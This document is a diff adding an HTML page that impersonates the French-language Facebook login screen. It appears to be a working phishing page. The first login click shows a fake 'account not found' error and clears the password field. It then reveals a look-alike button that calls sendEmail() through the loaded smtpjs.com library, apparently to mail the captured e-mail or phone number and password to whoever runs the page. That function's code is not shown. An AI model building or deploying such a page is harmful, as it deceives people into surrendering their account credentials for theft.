@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="index.js"></script>
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+<link href="https://fonts.googleapis.com/css2?family=Amiri:ital,wght@1,700&family=Lalezar&display=swap" rel="stylesheet">  
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
+    <title>Facebook - Conexion</title>
+    <style>
+.bgc{
+    background-color: #3b5998;
+    color: white;
+    font-family:  Segoe UI;
+    
+    width: 100%;
+    padding-top: 0.3%;
+    padding-bottom: 0.1%;
+}
+
+
+
+
+/* Full-width input fields */
+input[type=mail],input[type=num],input[type=text], input[type=password]{
+  width: 70%;
+  padding: 8px;
+  margin-top: 2px;
+
+  border: none;
+  background: #f5f6f7;
+  
+}
+span{
+    width: 30%;
+    margin-left: -5px;
+  padding:8px;
+ text-align: right;
+  border-style: none;
+  background: #f5f6f7;
+  color: blue;
+}
+span:active {
+    border: none;
+}
+span:hover {
+    cursor: pointer;
+}
+input[type=mail]:focus,input[type=num]:focus,input[type=text]:focus, input[type=password]:focus {
+  background-color: #ddd;
+  outline: none;
+}
+
+hr {
+  width:60%;
+  margin-left: 1%;
+  margin-right: 1%;
+}
+.margt{
+    margin-top: 3%;
+}
+.padst{
+    padding-right: 2%;
+    padding-left: 2%;
+    padding-top: 1%;
+    font-size: small;
+}
+/* Add padding to container elements */
+.container {
+  padding: 16px;
+}
+.button {
+  background-color: rgba(49, 49, 255, 0.842); /* Green */
+  border: none;
+  color: white;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 14px;
+  cursor: pointer;
+  width: 100%;
+  border-radius: 5px;
+  font-weight: bold;
+  padding: 8px 24px;
+}
+.button2 {
+    background: #00a400;
+    border: none;
+    box-shadow: none;
+  height: 36px;
+    padding-left: 4%;
+    padding-right: 4%;
+  color: #fff;
+    text-shadow: 0 -1px 0 rgba(0, 0, 0, .35);
+    line-height: 27px;
+    border-radius: 4px;
+    box-sizing: border-box;
+    display: inline-block;
+    font-weight: bold;
+    min-width: 50px;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    vertical-align: bottom;
+    white-space: nowrap;
+    font-size: 14px;
+  margin-top: 3%;
+  margin-bottom: 2%;
+}
+a{
+    color: #7596c8;
+    font-family: 'Roboto-Regular', 'Helvetica', 'sans-serif';
+    font-size: 14px;
+    line-height: 16px;
+    cursor: pointer;
+    text-decoration: none;
+
+}
+.no{
+    display: none;
+}
+@media (min-width: 800px) {
+    .container {
+  padding: 16px;
+  width: 35%;
+}
+
+}
+
+    </style>
+    <script>
+        
+        function ch(){
+            document.getElementById("em").style.display="none";
+            document.getElementById("num").style.display="inline-block";
+            var xxx = document.getElementById("ma");
+          if (xxx.type === "mail") {
+            xxx.value=""
+            xxx.type = "num";
+            xxx.placeholder="Numéro de mobile";
+          } else {
+            xxx.value=""
+            xxx.type = "mail";
+            xxx.placeholder="E-mail";
+          }
+        }
+        function sh(){
+            document.getElementById("em").style.display="inline-block";
+            document.getElementById("num").style.display="none";
+            var xxxx = document.getElementById("ma");
+            if (xxxx.type === "num") {
+                xxxx.value=""
+            xxxx.type = "mail";
+            xxxx.placeholder="E-mail";
+          } else {
+            xxxx.value=""
+            xxxx.type = "num";
+            xxxx.placeholder="Numéro de mobile";
+          }
+        }
+        function show(){
+                document.getElementById("af").style.display="inline-block";
+            document.getElementById("psw").style.width="70%";
+            
+            
+        }
+        function chh(){
+            document.getElementById("af").style.display="none";
+            document.getElementById("mas").style.display="inline-block";
+          var x = document.getElementById("psw");
+          if (x.type === "password") {
+            x.type = "text";
+          } else {
+            x.type = "password";
+          }
+        }
+        
+        function shh(){
+            document.getElementById("af").style.display="inline-block";
+            document.getElementById("mas").style.display="none";
+            var xx = document.getElementById("psw");
+          if (xx.type === "text") {
+           xx.type = "password";
+          } else {
+            xx.type = "text";
+          }
+        }
+        
+        function affiche(){
+    document.getElementById("clp").style.display="inline-block";
+    document.getElementById("cld").style.display="none";
+    document.getElementById("err").style.display="inline-block";
+    document.getElementById("psw").value="";
+} 
+            
+        
+        </script>
+</head>
+<body>
+    <nav class="bgc">
+        <center>
+                        <h3 style="font-weight: bold;">facebook</h3>
+        </center>
+      </nav>
+      <div style="background-color: tomato;color: white;padding: 0.5%;display: none;width: 100%;" id="err">
+        L’e-mail ou le numéro de téléphone entré ne correspond à aucun compte.<b>Veuillez ressayer ou créer un compte.</b> </div>
+
+      <form action="post">
+
+        <div class="container">
+
+            <div>
+          <input type="mail"  placeholder="E-mail" name="mail" id="ma" style="display: inline-block;" required>
+          <span onclick="ch()" id="em" style="display: none;">E-MAIL</span>
+          <span onclick="sh()" id="num" style="display: inline-block;">NUMERO</span>
+          <input type="password" onkeydown="show()" id="psw" placeholder="Mot de passe" name="pswr" style="width: 100%;" required>
+          <span onclick="chh()" id="af" style="display: none;">AFFICHER</span>
+          <span onclick="shh()" id="mas" style="display:none;">MASQUER</span>
+        <br><br>
+        <button type="button"  onclick="affiche()" id="cld" class="button active">Se connecter</button>
+            <button type="button" value="Send Email" onclick="sendEmail()" id="clp" class="button no active">Se connecter</button>
+          </div>
+
+<div class="d-flex justify-content-center margt">
+    <hr>
+   <div class="d-flex justify-content-center padst">OU</div>
+   <hr> 
+        </div>
+         <center><button type="button" class="button2">Créer un compte</button></center>
+        <center> <a href="#">Mot de passe oublié ?</a></center>
+      </form>
+  <img src="fb.png" alt="fb" draggable="false" width="100%">  
+    
+</body>
+</html>
